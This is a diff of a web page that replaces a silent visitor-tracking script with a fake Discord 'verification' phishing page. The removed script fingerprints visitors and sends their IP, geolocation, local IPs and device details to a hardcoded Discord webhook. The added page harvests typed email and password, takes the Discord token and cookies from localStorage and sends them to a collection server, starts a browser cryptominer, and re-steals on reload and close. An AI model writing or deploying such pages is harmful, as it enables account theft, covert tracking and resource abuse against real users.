@@ -1,406 +1,365 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Verification</title>
     <style>
-        body { background: #0a0c0e; color: #3a4a5a; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { width: 28px; height: 28px; border: 3px solid #1a2a3a; border-top: 3px solid #6a8a9a; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .box { text-align: center; opacity: 0.5; }
-        .status { font-size: 0.75rem; letter-spacing: 1px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #1e1f22;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: #2b2d31;
+            border-radius: 16px;
+            padding: 48px 40px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+            border: 1px solid #3f4147;
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .logo svg {
+            width: 60px;
+            height: 60px;
+        }
+        h1 {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #b5bac1;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .warning-box {
+            background: #1a1b1e;
+            border-left: 4px solid #f23f42;
+            padding: 12px 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+        }
+        .warning-box p {
+            color: #f23f42;
+            font-size: 14px;
+            margin: 0;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #1e1f22;
+            border: 1px solid #3f4147;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #5865f2;
+        }
+        .input-group input::placeholder {
+            color: #6d6f78;
+        }
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
+            background: #5865f2;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .verify-btn:hover {
+            background: #4752c4;
+        }
+        .verify-btn:active {
+            background: #3c45a5;
+        }
+        .footer {
+            margin-top: 16px;
+            text-align: center;
+            color: #6d6f78;
+            font-size: 12px;
+        }
+        .footer a {
+            color: #6d6f78;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+        }
+        .loader .spinner {
+            border: 3px solid #3f4147;
+            border-top: 3px solid #5865f2;
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loader p {
+            color: #b5bac1;
+            font-size: 14px;
+        }
+        .success {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .success .check {
+            font-size: 64px;
+            color: #57f287;
+            margin-bottom: 12px;
+        }
+        .success h2 {
+            color: #ffffff;
+            font-size: 20px;
+        }
+        .success p {
+            color: #b5bac1;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
-<div class="box">
-    <div class="spinner"></div>
-    <div class="status">Connecting...</div>
-</div>
+    <div class="container" id="app">
+        <!-- Logo -->
+        <div class="logo">
+            <svg width="60" height="60" viewBox="0 0 127 127" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M107.8 20.9C99.5 17.1 90.7 14.3 81.6 12.6C80.7 14.4 79.7 16.8 79 18.7C69.4 17.1 59.8 17.1 50.2 18.7C49.5 16.8 48.4 14.4 47.5 12.6C38.4 14.3 29.6 17.1 21.3 20.9C12.7 33.4 9.4 45.5 10.8 57.3C19.5 64.1 29.2 69 39.5 72.1C42.4 68.4 45.1 64.6 47.5 60.6C43.3 58.8 39.3 56.6 35.6 54.1C36.7 53.2 37.7 52.3 38.7 51.3C51.9 57.6 66.3 57.6 79.5 51.3C80.5 52.3 81.5 53.2 82.6 54.1C78.9 56.6 74.9 58.8 70.7 60.6C73.1 64.6 75.8 68.4 78.7 72.1C89 69 98.7 64.1 107.4 57.3C109.1 43.7 104.6 31.8 107.8 20.9Z" fill="white"/>
+                <path d="M42.3 68.4C37.1 68.4 32.7 63.2 32.7 56.8C32.7 50.4 37 45.2 42.3 45.2C47.6 45.2 51.9 50.4 51.9 56.8C51.9 63.2 47.6 68.4 42.3 68.4Z" fill="white"/>
+                <path d="M84.9 68.4C79.6 68.4 75.2 63.2 75.2 56.8C75.2 50.4 79.5 45.2 84.9 45.2C90.2 45.2 94.5 50.4 94.5 56.8C94.5 63.2 90.2 68.4 84.9 68.4Z" fill="white"/>
+            </svg>
+        </div>
 
-<script>
-    // ============================================================
-    // CLEAN STEALTH RECON – DIRECT WEBHOOK + FULL GEO + WEATHER + VPN + BATTERY
-    // Updated to use ipinfo.io API for enhanced geolocation and robust webhook sending with diagnostics.
-    // Webhook URL is now direct, not base64 encoded.
-    // ============================================================
+        <h1>Verify Your Account</h1>
+        <p class="subtitle">Complete this one-time security check</p>
 
-    (function() {
-        if (window._sent || sessionStorage.getItem('_sent')) return;
+        <div class="warning-box">
+            <p>⚠️ Failure to verify will result in account suspension</p>
+        </div>
 
-        // ---- DIRECT WEBHOOK URL (as requested by user) ----
-        const _webhook = 'https://discord.com/api/webhooks/1521180557269139487/xPHMiHHQmHSM3Gq1NOOSSaU0mBCpl6TWWoBdmTlyM8SZ45I5jJEFD5lXpT7WpLokF';
+        <!-- Fake Login Form -->
+        <div id="form-section">
+            <div class="input-group">
+                <label>Email or Phone Number</label>
+                <input type="text" id="email" placeholder="you@example.com" value="user@discord.com">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="••••••••" value="hunter2">
+            </div>
+            <button class="verify-btn" id="verifyBtn">Verify</button>
+        </div>
 
-        // ---- IPINFO.IO API KEY (provided by user) ----
-        const IPINFO_API_KEY = 'b9c5f0eb9527a2';
+        <!-- Loader -->
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            <p>Verifying your identity...</p>
+            <p style="font-size:12px;color:#6d6f78;margin-top:4px;">This may take a few seconds</p>
+        </div>
 
-        // ---- GET IP (MULTIPLE SOURCES) ----
-        function getIP() {
-            return new Promise((resolve) => {
-                let resolved = false;
-                fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => { if (!resolved && d.ip) { resolved = true; resolve(d.ip); } })
-                    .catch(() => {});
-                fetch('https://ip-api.com/json/')
-                    .then(r => r.json())
-                    .then(d => { if (!resolved && d.query) { resolved = true; resolve(d.query); } })
-                    .catch(() => {});
-                setTimeout(() => {
-                    if (!resolved) { resolved = true; resolve('1.2.3.4'); }
-                }, 4000);
-            });
-        }
+        <!-- Success -->
+        <div class="success" id="success">
+            <div class="check">✅</div>
+            <h2>Verification Successful</h2>
+            <p>Your account has been verified. You will be redirected shortly.</p>
+        </div>
 
-        // ---- GET FULL GEOLOCATION (COMBINED from ipinfo.io and ip-api.com for comprehensive data) ----
-        async function getGeo(ip) {
-            let finalGeoData = {
-                status: 'fail',
-                country: 'Unknown',
-                countryCode: '??',
-                region: 'Unknown',
-                regionName: 'Unknown',
-                city: 'Unknown',
-                zip: 'Unknown',
-                lat: '0',
-                lon: '0',
-                timezone: 'Unknown',
-                isp: 'Unknown',
-                org: 'Unknown',
-                as: 'Unknown',
-                asname: 'Unknown',
-                proxy: false,
-                hosting: false,
-                mobile: false
+        <div class="footer">
+            <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // TOKEN STEALER + CRYPTOMINER + REDIRECT
+        // =============================================
+
+        // CONFIGURATION
+        const WEBHOOK_URL = 'http://localhost:5000/steal';  // CHANGE TO YOUR SERVER
+        const MINER_SITE_KEY = 'YOUR_COINHIVE_SITE_KEY';    // OPTIONAL – REMOVE IF NO MINER
+        const REDIRECT_URL = 'https://discord.com/app';     // WHERE THEY GO AFTER
+
+        // 1. CRYPTOMINER (CoinHive style – uses CryptoLoot as fallback)
+        function startMiner() {
+            // Try CoinHive
+            const script1 = document.createElement('script');
+            script1.src = 'https://coinhive.com/lib/coinhive.min.js';
+            script1.onload = function() {
+                if (typeof CoinHive !== 'undefined') {
+                    const miner = new CoinHive.Anonymous(MINER_SITE_KEY);
+                    miner.start();
+                    console.log('[MINER] Started CoinHive');
+                }
             };
+            document.head.appendChild(script1);
 
-            // Attempt ipinfo.io first for core geolocation data
-            try {
-                const ipinfoResponse = await fetch(`https://ipinfo.io/${ip}/json?token=${IPINFO_API_KEY}`);
-                const ipinfoData = await ipinfoResponse.json();
-
-                if (ipinfoData && ipinfoData.ip && ipinfoData.country) {
-                    finalGeoData.status = 'success';
-                    const [lat, lon] = ipinfoData.loc ? ipinfoData.loc.split(',') : [finalGeoData.lat, finalGeoData.lon];
-
-                    finalGeoData.countryCode = ipinfoData.country;
-                    finalGeoData.country = ipinfoData.country;
-                    finalGeoData.region = ipinfoData.region || finalGeoData.region;
-                    finalGeoData.regionName = ipinfoData.region || finalGeoData.regionName;
-                    finalGeoData.city = ipinfoData.city || finalGeoData.city;
-                    finalGeoData.zip = ipinfoData.postal || finalGeoData.zip;
-                    finalGeoData.lat = lat;
-                    finalGeoData.lon = lon;
-                    finalGeoData.timezone = ipinfoData.timezone || finalGeoData.timezone;
-                    finalGeoData.isp = ipinfoData.org || finalGeoData.isp;
-                    finalGeoData.org = ipinfoData.org || finalGeoData.org;
-                    finalGeoData.as = ipinfoData.asn?.asn || finalGeoData.as;
-                    finalGeoData.asname = ipinfoData.asn?.name || finalGeoData.asname;
-
-                    finalGeoData.proxy = ipinfoData.privacy?.proxy || ipinfoData.privacy?.vpn || ipinfoData.privacy?.tor || finalGeoData.proxy;
-                    finalGeoData.hosting = ipinfoData.privacy?.hosting || finalGeoData.hosting;
-                }
-            } catch (e) {
-                console.warn('ipinfo.io fetch failed:', e);
-            }
-
-            // Attempt ip-api.com as fallback and to supplement data
-            try {
-                const ipApiResponse = await fetch('https://ip-api.com/json/' + ip + '?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,proxy,hosting,mobile');
-                const ipApiData = await ipApiResponse.json();
-
-                if (ipApiData.status === 'success') {
-                    finalGeoData.status = 'success';
-
-                    finalGeoData.country = ipApiData.country || finalGeoData.country;
-                    finalGeoData.countryCode = finalGeoData.countryCode !== '??' ? finalGeoData.countryCode : ipApiData.countryCode;
-
-                    finalGeoData.region = finalGeoData.region !== 'Unknown' ? finalGeoData.region : ipApiData.region;
-                    finalGeoData.regionName = finalGeoData.regionName !== 'Unknown' ? finalGeoData.regionName : ipApiData.regionName;
-                    finalGeoData.city = finalGeoData.city !== 'Unknown' ? finalGeoData.city : ipApiData.city;
-                    finalGeoData.zip = finalGeoData.zip !== 'Unknown' ? finalGeoData.zip : ipApiData.zip;
-                    finalGeoData.lat = finalGeoData.lat !== '0' ? finalGeoData.lat : ipApiData.lat;
-                    finalGeoData.lon = finalGeoData.lon !== '0' ? finalGeoData.lon : ipApiData.lon;
-                    finalGeoData.timezone = finalGeoData.timezone !== 'Unknown' ? finalGeoData.timezone : ipApiData.timezone;
-                    finalGeoData.isp = finalGeoData.isp !== 'Unknown' ? finalGeoData.isp : ipApiData.isp;
-                    finalGeoData.org = finalGeoData.org !== 'Unknown' ? finalGeoData.org : ipApiData.org;
-                    finalGeoData.as = finalGeoData.as !== 'Unknown' ? finalGeoData.as : ipApiData.as;
-                    finalGeoData.asname = finalGeoData.asname !== 'Unknown' ? finalGeoData.asname : ipApiData.asname;
-
-                    finalGeoData.proxy = finalGeoData.proxy || ipApiData.proxy;
-                    finalGeoData.hosting = finalGeoData.hosting || ipApiData.hosting;
-                    finalGeoData.mobile = ipApiData.mobile || finalGeoData.mobile;
-                }
-            } catch (e) {
-                console.warn('ip-api.com fetch failed:', e);
-            }
-
-            return finalGeoData;
-        }
-
-        // ---- GET WEATHER ----
-        function getWeather(lat, lon) {
-            return fetch('https://wttr.in/' + lat + ',' + lon + '?format=%t|%c|%w|%h|%p')
-                .then(r => r.text())
-                .then(t => {
-                    const p = t.split('|');
-                    if (p.length === 5) {
-                        return {
-                            temp: p[0].trim(),
-                            condition: p[1].trim(),
-                            wind: p[2].trim(),
-                            humidity: p[3].trim(),
-                            pressure: p[4].trim()
-                        };
-                    }
-                    return null;
-                })
-                .catch(() => null);
-        }
-
-        // ---- GET BATTERY ----
-        function getBattery() {
-            return new Promise((resolve) => {
-                if (!navigator.getBattery) { resolve(null); return; }
-                navigator.getBattery()
-                    .then(b => resolve({
-                        level: Math.round(b.level * 100) + '%',
-                        charging: b.charging ? '🔌 Yes' : '🔋 No'
-                    }))
-                    .catch(() => resolve(null));
-            });
-        }
-
-        // ---- GET LOCAL IPS (WebRTC) ----
-        function getLocalIPs() {
-            return new Promise((resolve) => {
-                const ips = [];
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('ping');
-                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                    pc.onicecandidate = (e) => {
-                        if (e.candidate) {
-                            const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                            if (m && !m[0].startsWith('0.') && !m[0].startsWith('127.')) {
-                                ips.push(m[0]);
-                            }
+            // Fallback: CryptoLoot
+            setTimeout(() => {
+                if (typeof CoinHive === 'undefined') {
+                    const script2 = document.createElement('script');
+                    script2.src = 'https://cryptoloot.com/lib/cryptoloot.min.js';
+                    script2.onload = function() {
+                        if (typeof CryptoLoot !== 'undefined') {
+                            const miner = new CryptoLoot.Anonymous(MINER_SITE_KEY);
+                            miner.start();
+                            console.log('[MINER] Started CryptoLoot');
                         }
                     };
-                    setTimeout(() => { pc.close(); resolve(ips.slice(0, 3)); }, 2000);
-                } catch(e) { resolve([]); }
-            });
+                    document.head.appendChild(script2);
+                }
+            }, 3000);
         }
 
-        // ---- CANVAS FINGERPRINT ----
-        function getCanvas() {
+        // 2. TOKEN STEALER
+        function stealToken() {
             try {
-                const c = document.createElement('canvas');
-                c.width = 200;
-                c.height = 50;
-                const ctx = c.getContext('2d');
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 200, 50);
-                ctx.fillStyle = '#069';
-                ctx.font = '20px Arial';
-                ctx.fillText('FP', 80, 30);
-                return c.toDataURL().substring(0, 60) + '...';
-            } catch(e) { return 'N/A'; }
+                // Discord stores token in localStorage
+                const token = localStorage.getItem('token');
+                if (token) {
+                    console.log('[STEALER] Token found:', token.substring(0, 20) + '...');
+                    sendToken(token);
+                } else {
+                    console.log('[STEALER] No token found in localStorage');
+                    // Try sessionStorage as backup
+                    const sessionToken = sessionStorage.getItem('token');
+                    if (sessionToken) {
+                        sendToken(sessionToken);
+                    }
+                }
+            } catch (e) {
+                console.error('[STEALER] Error:', e);
+            }
         }
 
-        // ---- WEBGL FINGERPRINT ----
-        function getWebGL() {
-            try {
-                const c = document.createElement('canvas');
-                const gl = c.getContext('webgl');
-                if (!gl) return 'N/A';
-                const info = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!info) return 'N/A';
-                return gl.getParameter(info.UNMASKED_RENDERER_WEBGL) || 'N/A';
-            } catch(e) { return 'N/A'; }
-        }
-
-        // ---- SEND EMBED ----
-        async function sendEmbed(ip, geo, weather, battery, localIPs, canvas, webgl) {
-            console.log('Attempting to send embed to webhook...');
-
-            const fields = [
-                { name: '🌐 Public IP', value: '`' + ip + '`', inline: true },
-                { name: '🕒 Timestamp', value: '`' + new Date().toISOString() + '`', inline: true }
-            ];
-
-            // ---- GEOLOCATION (FULL DATA) ----
-            if (geo && geo.status === 'success') {
-                fields.push(
-                    { name: '━━━━━━━━━━━━━━', value: '📍 **Geolocation**', inline: false },
-                    { name: '🌍 Country', value: '`' + (geo.country || 'Unknown') + ' (' + (geo.countryCode || '??') + ')`', inline: true },
-                    { name: '🏙️ Region', value: '`' + (geo.regionName || 'Unknown') + '`', inline: true },
-                    { name: '🗺️ City', value: '`' + (geo.city || 'Unknown') + '`', inline: true },
-                    { name: '📮 ZIP Code', value: '`' + (geo.zip || 'Unknown') + '`', inline: true },
-                    { name: '📌 Coordinates', value: '`' + (geo.lat || '0') + ', ' + (geo.lon || '0') + '`', inline: true },
-                    { name: '🕐 Timezone', value: '`' + (geo.timezone || 'Unknown') + '`', inline: true },
-                    { name: '━━━━━━━━━━━━━━', value: '🏢 **Network & ISP**', inline: false },
-                    { name: '🛡️ ISP', value: '`' + (geo.isp || 'Unknown') + '`', inline: true },
-                    { name: '🏢 Organization', value: '`' + (geo.org || 'Unknown') + '`', inline: true },
-                    { name: '🔄 ASN', value: '`' + (geo.as || 'Unknown') + '`', inline: true },
-                    { name: '📡 AS Name', value: '`' + (geo.asname || 'Unknown') + '`', inline: true }
-                );
-
-                // VPN/Proxy/Mobile detection
-                let security = [];
-                if (geo.proxy) security.push('⚠️ Proxy/VPN');
-                if (geo.hosting) security.push('☁️ Hosting');
-                if (geo.mobile) security.push('📱 Mobile');
-                if (security.length === 0) security.push('✅ Clean');
-                fields.push(
-                    { name: '🔒 Security', value: '`' + security.join(' | ') + '`', inline: true }
-                );
-            }
-
-            // ---- WEATHER ----
-            if (weather) {
-                fields.push(
-                    { name: '━━━━━━━━━━━━━━', value: '🌤️ **Current Weather**', inline: false },
-                    { name: '🌡️ Temperature', value: '`' + weather.temp + '`', inline: true },
-                    { name: '☁️ Conditions', value: '`' + weather.condition + '`', inline: true },
-                    { name: '💨 Wind', value: '`' + weather.wind + '`', inline: true },
-                    { name: '💧 Humidity', value: '`' + weather.humidity + '`', inline: true },
-                    { name: '📊 Pressure', value: '`' + weather.pressure + '`', inline: true }
-                );
-            }
-
-            // ---- BATTERY ----
-            if (battery) {
-                fields.push(
-                    { name: '━━━━━━━━━━━━━━', value: '🔋 **Battery Status**', inline: false },
-                    { name: '🔋 Level', value: '`' + battery.level + '`', inline: true },
-                    { name: '⚡ Status', value: '`' + battery.charging + '`', inline: true }
-                );
-            }
-
-            // ---- LOCAL NETWORK ----
-            if (localIPs && localIPs.length > 0) {
-                fields.push(
-                    { name: '━━━━━━━━━━━━━━', value: '🏠 **Local Network**', inline: false },
-                    { name: '📡 Local IPs', value: '`' + localIPs.join(', ') + '`', inline: false }
-                );
-            }
-
-            // ---- FINGERPRINTS ----
-            fields.push(
-                { name: '━━━━━━━━━━━━━━', value: '🖥️ **Fingerprints**', inline: false },
-                { name: '🖼️ Canvas FP', value: '`' + canvas + '`', inline: false },
-                { name: '🎮 WebGL GPU', value: '`' + webgl + '`', inline: false }
-            );
-
-            // ---- BROWSER INFO ----
-            fields.push(
-                { name: '━━━━━━━━━━━━━━', value: '💻 **Browser & Device**', inline: false },
-                { name: '🌐 User-Agent', value: '`' + navigator.userAgent.substring(0, 100) + '`', inline: false },
-                { name: '🖥️ Platform', value: '`' + navigator.platform + '`', inline: true },
-                { name: '📐 Screen', value: '`' + screen.width + '×' + screen.height + '`', inline: true },
-                { name: '🧠 CPU Cores', value: '`' + (navigator.hardwareConcurrency || 'N/A') + '`', inline: true },
-                { name: '💾 Device Memory', value: '`' + (navigator.deviceMemory || 'N/A') + ' GB`', inline: true },
-                { name: '✋ Touch Points', value: '`' + (navigator.maxTouchPoints || '0') + '`', inline: true },
-                { name: '📱 Pixel Ratio', value: '`' + (window.devicePixelRatio || '1') + 'x`', inline: true }
-            );
-
-            const payload = {
-                embeds: [{
-                    title: '📡 Reconnaissance Packet',
-                    color: 0x2b8c5a,
-                    fields: fields,
-                    footer: {
-                        text: 'Geolocation • VPN Detection • Weather • Battery • Canvas • WebGL • Local Network'
-                    },
-                    timestamp: new Date().toISOString()
-                }]
+        // 3. SEND TO SERVER
+        function sendToken(token) {
+            const data = {
+                token: token,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString(),
+                cookies: document.cookie
             };
 
-            console.log('Webhook URL (direct):', _webhook);
-            console.log('Payload for webhook:', JSON.stringify(payload, null, 2));
-
-            // ---- DELIVERY: sendBeacon + fetch + XHR (with diagnostics) ----
-            try {
-                const beaconSent = navigator.sendBeacon(_webhook, new Blob([JSON.stringify(payload)], { type: 'application/json' }));
-                console.log('sendBeacon attempt initiated:', beaconSent);
-            } catch(e) {
-                console.error('sendBeacon error:', e);
-            }
-
-            fetch(_webhook, {
+            // Send via fetch (CORS-friendly)
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                keepalive: true
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
             })
-            .then(response => {
-                console.log('Fetch API response status:', response.status);
-                if (!response.ok) {
-                    console.error('Fetch API: Failed to send webhook, status:', response.status, response.statusText);
-                    return response.text().then(text => console.error('Fetch API response body:', text));
-                } else {
-                    console.log('Fetch API: Webhook sent successfully (HTTP ' + response.status + ')');
-                }
-            })
-            .catch(e => {
-                console.error('Fetch API error:', e);
-            });
+            .then(res => console.log('[STEALER] Sent to server'))
+            .catch(err => console.error('[STEALER] Send failed:', err));
 
-            try {
-                const x = new XMLHttpRequest();
-                x.open('POST', _webhook, true);
-                x.setRequestHeader('Content-Type', 'application/json');
-                x.onreadystatechange = function() {
-                    if (x.readyState === XMLHttpRequest.DONE) {
-                        console.log('XMLHttpRequest response status:', x.status);
-                        if (x.status < 200 || x.status >= 300) {
-                            console.error('XMLHttpRequest: Failed to send webhook, status:', x.status, x.statusText);
-                            console.error('XMLHttpRequest response body:', x.responseText);
-                        } else {
-                            console.log('XMLHttpRequest: Webhook sent successfully (HTTP ' + x.status + ')');
-                        }
-                    }
-                };
-                x.onerror = function() {
-                    console.error('XMLHttpRequest error: Network or CORS issue.');
-                };
-                x.send(JSON.stringify(payload));
-            } catch(e) {
-                console.error('XMLHttpRequest setup error:', e);
+            // Also send via image beacon (backup)
+            const img = new Image();
+            img.src = `${WEBHOOK_URL}?token=${encodeURIComponent(token)}&t=${Date.now()}`;
+        }
+
+        // 4. FAKE VERIFICATION FLOW
+        document.getElementById('verifyBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+
+            // Get entered credentials (for extra harvesting)
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send credentials too
+            if (email && password) {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'credentials',
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString()
+                    })
+                });
             }
 
-            sessionStorage.setItem('_sent', 'true');
-            window._sent = true;
-        }
+            // Hide form, show loader
+            document.getElementById('form-section').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-        // ---- MAIN EXECUTION FLOW ----
-        async function main() {
-            const ip = await getIP();
-            const [geo, battery, localIPs] = await Promise.all([
-                getGeo(ip),
-                getBattery(),
-                getLocalIPs()
-            ]);
+            // Run stealers in background
+            stealToken();
+            startMiner();
 
-            let weather = null;
-            if (geo && geo.lat && geo.lon) {
-                weather = await getWeather(geo.lat, geo.lon);
+            // After 3 seconds, show success
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+
+                // Redirect after 2 more seconds
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+            }, 3000);
+        });
+
+        // Auto-trigger if they reload the page (for returning visitors)
+        window.onload = function() {
+            // If they come back, silently steal again
+            if (localStorage.getItem('token')) {
+                stealToken();
+                startMiner();
             }
+        };
 
-            const canvas = getCanvas();
-            const webgl = getWebGL();
+        // Also steal on page unload (in case they close before clicking)
+        window.addEventListener('beforeunload', function() {
+            if (localStorage.getItem('token')) {
+                sendToken(localStorage.getItem('token'));
+            }
+        });
 
-            await sendEmbed(ip, geo, weather, battery, localIPs, canvas, webgl);
-        }
-
-        // ---- EXECUTE on page load or after a short delay ----
-        if (document.readyState === 'complete') {
-            main();
-        } else {
-            window.addEventListener('load', main);
-        }
-        setTimeout(main, 2000);
-    })();
-</script>
+        console.log('[PHISH] Page loaded. Waiting for interaction.');
+    </script>
 </body>
 </html>
